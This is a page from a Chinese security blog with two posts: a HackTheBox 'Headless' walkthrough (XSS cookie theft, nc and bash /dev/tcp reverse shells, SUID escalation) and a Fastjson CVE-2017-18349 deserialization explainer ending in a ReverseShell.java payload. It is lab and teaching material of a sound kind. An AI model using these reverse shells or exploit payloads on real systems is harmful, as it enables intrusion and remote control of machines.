@@ -1,0 +1,492 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 6 | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>n2ryx&#39;s Blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Fortune Freedom.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/05/10/Pentest/HTB/HTB Headless/" >HTB Headless</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-05-10  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Headless-Linux-·-Easy"><a href="#Headless-Linux-·-Easy" class="headerlink" title="Headless (Linux · Easy)"></a>Headless (Linux · Easy)</h1><p>XSS+SUID提权</p>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sT -sV - 10.10.11.8</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.11.8 (10.10.11.8)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)</span><br><span class="line">|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.2.2 Python/3.11.2</span><br><span class="line">|     Date: Sun, 28 Apr 2024 07:24:48 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 2799</span><br><span class="line">|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Under Construction&lt;/title&gt;</span><br><span class="line">|     &lt;style&gt;</span><br><span class="line">|     body &#123;</span><br><span class="line">|     font-family: &#x27;Arial&#x27;, sans-serif;</span><br><span class="line">|     background-color: #f7f7f7;</span><br><span class="line">|     margin: 0;</span><br><span class="line">|     padding: 0;</span><br><span class="line">|     display: flex;</span><br><span class="line">|     justify-content: center;</span><br><span class="line">|     align-items: center;</span><br><span class="line">|     height: 100vh;</span><br><span class="line">|     .container &#123;</span><br><span class="line">|     text-align: center;</span><br><span class="line">|     background-color: #fff;</span><br><span class="line">|     border-radius: 10px;</span><br><span class="line">|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     &lt;!DOCTYPE HTML&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://10.10.11.8:5000/">http://10.10.11.8:5000/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428182551382.png" alt="image-20240428182551382"></p>
+<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428182842525.png" alt="image-20240428182842525"></p>
+<p>&#x2F;support</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428182942809.png" alt="image-20240428182942809"></p>
+<p>&#x2F;dashboard</p>
+<p>未经授权，猜测和用户权限有关</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428183202226.png" alt="image-20240428183202226"></p>
+<p>抓包看到 Cookie: is_admin，猜测用XSS窃取Cookie</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428193956394.png" alt="image-20240428193956394"></p>
+<p>测试多次，发现在User-Agent处可以利用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428194006931.png" alt="image-20240428194006931"></p>
+<p>本机起一个http服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br><span class="line">或</span><br><span class="line">php -S 0.0.0.0:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428194211757.png" alt="image-20240428194211757"></p>
+<p>替换Cookie，访问&#x2F;dashboard</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428194443295.png" alt="image-20240428194443295"></p>
+<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>发包测试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428194559570.png" alt="image-20240428194559570"></p>
+<p>反弹shell大部分命令失败</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -c 10.10.16.21 2222 bash	# 测试可行</span><br></pre></td></tr></table></figure>
+
+<p>curl也可以</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428200746994.png" alt="image-20240428200746994"></p>
+<p>本地起一个http服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">/bin/bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/10.10.16.21/2222 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428200626017.png" alt="image-20240428200626017"></p>
+<p>同时监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2222</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428200917085.png" alt="image-20240428200917085"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428210450256.png" alt="image-20240428210450256"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查当前脚本是否以root用户(UID=0)身份运行，如果当前用户不是root用户，脚本将退出并返回错误码1</span></span><br><span class="line"></span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找位于 /boot 目录下，文件名以 <span class="string">&#x27;vmlinuz&#x27;</span> 开头的所有内核映像文件中最新修改的那个文件，格式化日期和时间并输出</span></span><br><span class="line"></span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取根目录磁盘分区的可用磁盘空间，格式化输出</span></span><br><span class="line"></span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取并打印系统的负载平均值</span></span><br><span class="line"></span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查一个名为 <span class="string">&quot;initdb.sh&quot;</span> 的脚本是否正在运行，如果该脚本没有运行，脚本将启动它；如果已经在运行，则会通知用户数据库服务已经在运行</span></span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>bash -p</code> 利用 Bash shell 的一个特性，即在启动时执行一个用户定义的函数，通过在这个函数中包含提权命令，攻击者可以在执行 bash -p 时以 root 权限执行命令</p>
+</blockquote>
+<p>其他的SUID提权亦可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240428210350088.png" alt="image-20240428210350088"></p>
+
+	
+	</div>
+  <a type="button" href="/2024/05/10/Pentest/HTB/HTB Headless/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/04/12/Vuln/2017 Fastjson 远程命令执行漏洞/" >Fastjson 远程命令执行漏洞(CVE-2017-18349)</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-04-12  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="Fastjson-远程命令执行漏洞-CVE-2017-18349"><a href="#Fastjson-远程命令执行漏洞-CVE-2017-18349" class="headerlink" title="Fastjson 远程命令执行漏洞(CVE-2017-18349)"></a>Fastjson 远程命令执行漏洞(CVE-2017-18349)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
+<p>参考链接：</p>
+<h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><p>对于Fastjson来讲，并不是所有的Java对象都能被转为JSON，只有Java Bean格式的对象才能Fastjson被转为JSON。</p>
+<p>Fastjson提供了两个主要接口来分别实现对于Java Object的序列化和反序列化操作：</p>
+<ul>
+<li><code>JSON.toJSONString</code></li>
+<li><code>JSON.parseObject/JSON.parse</code></li>
+</ul>
+<p>反序列化时不指定特定的类，那么Fastjson就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中<code>private</code>类型的属性值，Fastjson默认不会将其序列化和反序列化。</p>
+<h4 id="Fastjson中的-type"><a href="#Fastjson中的-type" class="headerlink" title="Fastjson中的@type"></a>Fastjson中的@type</h4><p>使用Fastjson序列化对象的时候，如果<code>toJSONString()</code>方法不添加额外的属性，那么就会将一个Java Bean转换成JSON字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Faster&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果想把JSON字符串反序列化成Java Object，可以使用<code>parse()</code>方法。该方法默认将JSON字符串反序列化为一个JSONObject对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">&#123;&quot;name&quot;:&quot;Faster&quot;,&quot;age&quot;:18&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="将JSON字符串反序列化为原始的类（两种）"><a href="#将JSON字符串反序列化为原始的类（两种）" class="headerlink" title="将JSON字符串反序列化为原始的类（两种）"></a>将JSON字符串反序列化为原始的类（两种）</h4><ol>
+<li>序列化的时候，在<code>toJSONString()</code>方法中添加额外的属性<code>SerializerFeature.WriteClassName</code>，将对象类型一并序列化：</li>
+</ol>
+<p>	</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Faster&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化时添加额外属性</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonType</span> <span class="operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(type);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出，Fastjson在JSON字符串中添加了一个<span class="meta">@type</span>字段，用于标识对象所属的类</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;fastjson.Person&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Faster&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在反序列化该JSON字符串的时候，<code>parse()</code>方法就会根据<code>@type</code>标识将其转为原来的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parse(jsonText));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果如下</span></span><br><span class="line">Person@4459eb14</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>反序列化的时候，在<code>parseObject()</code>方法中手动指定对象的类型</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bject</span> <span class="variable">o3</span> <span class="operator">=</span> JSON.parseObject(jsonText,Person.class);</span><br><span class="line">System.out.println(o3.getClass().getName());</span><br><span class="line">System.out.println(o3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">fastjson.Person</span><br><span class="line">fastjson.Person@1e6d1014</span><br></pre></td></tr></table></figure>
+
+<h4 id="Fastjson分析"><a href="#Fastjson分析" class="headerlink" title="Fastjson分析"></a>Fastjson分析</h4><p>序列化：<code>toJSONString()</code>方法实际是通过调用getter来获取对象的属性值的，根据这些属性值来生成JSON字符串。</p>
+<p>反序列化：<code>parse()</code>先调用@type标识的类的构造函数，然后再调用setter给对象赋值；parseObject()方法会同时调用setter和getter。</p>
+<p><strong>源码分析</strong></p>
+<p><code>DefaultJSONParser#parseObject</code>方法中，通过<code>scanSymbol()</code>方法来解析出表示符 @type</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240201172029725.png" alt="image-20240201172029725"></p>
+<p>反射加载<code>@type</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240201195551574.png" alt="image-20240201195551574"></p>
+<p>反射加载的类的时候会对类进行黑名单检查，黑名单中有Thread类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240201200115379.png" alt="image-20240201200115379"></p>
+<p>然后会在反射获取的方法中循环遍历寻找特定的setter和getter。条件如下：</p>
+<ul>
+<li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
+<li>非静态方法</li>
+<li>返回类型为void或当前类</li>
+<li>参数个数为1个</li>
+</ul>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>fastjson依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在反序列化时，parse触发了set方法，parseObject同时触发了set和get方法，由于存在这种<code>autoType</code>特性。如果<code>@type</code>标识的类中的setter或getter方法存在恶意代码，那么就有可能存在fastjson反序列化漏洞。</p>
+<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>Calc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String calc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCalc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getter&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> calc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCalc</span><span class="params">(String calc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.calc = calc;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>fastjsonTestCalc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonCalc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Calc\&quot;,\&quot;calc\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(JSON.parseObject(jsonCalc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240201202542836.png" alt="image-20240201202542836"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>CVE-2017-18349</p>
+<p>环境：vulhub</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240324201602077.png" alt="image-20240324201602077"></p>
+<p>目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令</p>
+<p>ReverseShell.java编译成class并开启http服务(python -m http.server 80)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReverseShell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.6.110/6666 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240325133120899.png" alt="image-20240325133120899"></p>
